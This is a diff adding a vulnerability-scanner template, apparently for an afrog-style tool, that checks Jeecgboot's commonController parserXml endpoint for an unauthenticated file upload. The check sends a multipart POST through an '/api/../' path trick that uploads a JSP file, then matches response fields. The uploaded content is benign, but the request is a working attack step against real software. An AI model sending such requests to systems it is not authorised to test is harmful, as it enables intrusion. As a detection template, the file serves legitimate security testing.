@@ -1,0 +1,28 @@
+id: jeecgboot-commoncontroller-parserxml-fileupload
+
+info:
+  name: Jeecgboot commonController parserXml fileupload
+  severity: critical
+  author: zan8in
+  verified: true
+  tags: jeecgboot,fileupload
+  created: 2024/04/10
+
+set:
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /api/../commonController.do?parserXml
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+        Te: trailers
+      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"666.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n111\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"attributes"') && 
+      response.body.bcontains(b'"obj"') && 
+      response.body.bcontains(b'"jsonStr"') && 
+      response.body.bcontains(b'"success"')
+expression: r0()
